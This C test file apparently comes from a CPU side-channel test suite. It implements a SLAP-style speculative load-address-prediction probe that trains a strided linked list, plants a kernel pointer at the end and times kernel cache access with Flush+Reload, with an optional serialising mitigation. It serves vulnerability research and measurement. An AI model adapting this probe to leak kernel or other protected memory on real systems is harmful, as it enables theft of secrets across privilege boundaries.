#include "kernel_lap_test.h"

#include "../tester.h"

#include "../cache/cache_test.h"

#include "immintr.h"
#include "mem.h"
#include "rand.h"
#include "types.h"

AS_RESULT(kernel_lap_result_t);

// CREDITS:
// https://github.com/slap-flop/slap-artifacts/blob/main/slap/oob-reads.c

struct node_t {
  volatile unsigned char **data;
  struct node_t *next;
};

// Each node takes 128 bytes (=L2 cacheline size) or 256 bytes
// such that 1) they can be flushed independently and 2)
// the node addresses do not stride - only the pointers to data.
struct node_t *createNode(volatile unsigned char **data) {
  const int L2_LINE_SZ = 128;
  struct node_t *newNode =
      (struct node_t *)alloc(L2_LINE_SZ * get_rand_in_range(1, 2));

  newNode->data = data;
  newNode->next = (void *)0;
  return newNode;
}

// insertAtEnd returns a pointer to the newly
// created node, such that we can flush the last node
// when measuring for speculation.
struct node_t *insertAtEnd(struct node_t **head,
                           volatile unsigned char **data) {
  struct node_t *newNode = createNode(data);
  if (*head == (void *)0) {
    *head = newNode;
  } else {
    struct node_t *current = *head;
    while (current->next != (void *)0) {
      current = current->next;
    }
    current->next = newNode;
  }
  return newNode;
}

// Constants for memory allocations. Linked list length
// and stride are fixed to optimal parameters of
// 1000 training loads, 32 bytes apart.
#define LL_SIZE 1000
#define STRIDE 32
#define PAGE_SZ 16384
#define L2_LINE_SZ 128

// This is for sizing the buffer where the striding
// memory accesses load from.
#define NUM_PAGES_BUF (1 + (LL_SIZE * STRIDE) / PAGE_SZ)

// Make the dummy and secret pages 10*16KiB wide, so that the
// LAP definitely can't reach it with the 255B stride limit.
// Also, for more certainty in our signal, access different page offsets.
#define NUM_PAGES_OTH 10
#define DUMMY_OFFSET 0x3210
#define SECRET_OFFSET 0x1234

// How many linked list traversals should be performed
// between each Flush+Reload measurement?
#define TRIALS 20

void func(request_dependencies_t *args) {
  cache_result_t *cache_r = args[1];

  RESULT->overhead = cache_r->overhead;
  RESULT->uncached_access_time = cache_r->uncached_access_time;
  usize tries = cache_r->tries / 10;

  // When measuring activation rate, how many runs
  // should be performed?
  RESULT->iters = cache_r->tries;

  // Allocate buffer pages.
  u8 *buffer = alloc(NUM_PAGES_BUF * PAGE_SZ);
  for (int i = 0; i < NUM_PAGES_BUF * PAGE_SZ; i++) {
    buffer[i] = 'A';
  }

  // Allocate dummy pages. Mispredicted pointer points to secret page,
  // while all other pointers (deref'd architecturally) will point
  // to the dummy pages. Using different page offsets and cache sets to
  // increase certainty in results.
  u8 *dummy_pages = alloc(NUM_PAGES_OTH * PAGE_SZ);
  for (int i = 0; i < NUM_PAGES_BUF * PAGE_SZ; i++) {
    dummy_pages[i] = 0xff;
  }

  ker_open();

  // Allocate secret pages.
  volatile usize CACHE_LINE_ALIGNED *kernel_cache_line = get_kernel_ptr();

  struct node_t *ll = (void *)0;
  struct node_t *lastNode = (void *)0;
  for (int i = 0; i < LL_SIZE; ++i) {
    volatile unsigned char *temp =
        (volatile unsigned char *)buffer + i * STRIDE;
    volatile unsigned char **ptr = (volatile unsigned char **)temp;

    if (i == LL_SIZE - 1) {
      *ptr = (volatile char *)kernel_cache_line;

      // Then, decrement the pointer, making
      // the new pointer disobey the stride and
      // point to a randomized dummy address instead.
      ptr = (volatile unsigned char **)(temp - 5 * STRIDE);
      lastNode = insertAtEnd(&ll, ptr);
    } else {
      // All architectural accesses from the linked list traversal should
      // lead to 0xff (dummy data) being sent over Flush+Reload.
      *ptr = dummy_pages + get_rand_in_range(0, 32);
      insertAtEnd(&ll, ptr);
    }
  }

  for (int i = 0; i < RESULT->iters; ++i) {
    kernel_ptr_cache_flush();

    serialise();
    memory_barrier();

    // Traverse the linked list, chasing the pointers.
    // Even with -O3, need the first three vars to be declared
    // with the register keyword to prevent extra loads/stores to
    // stack. Trash MUST be declared volatile, or else the compiler
    // optimizes out this entire loop.
    for (int i = 0; i < TRIALS; ++i) {
      // Flush the last node to force LAP to speculate.
      cache_line_flush((void *)lastNode);

      // Cache the predicted load address.
      *(volatile char *)(lastNode->data + 5 * STRIDE);

      struct node_t *head = ll;
      while (head != (void *)0) {
        register unsigned char **int_ptr = (unsigned char **)(head->data);
        register unsigned char *lap_load = *int_ptr;
        register unsigned char secret = *lap_load;
        volatile unsigned char trash = secret;
        load(&trash);
#ifdef MITIGATE
        serialise();
#endif
        head = head->next;
      }
    }

    RESULT->measured_access_time_tot += get_kernel_time();
  }

  ker_close();
}

#include "../tester.c"
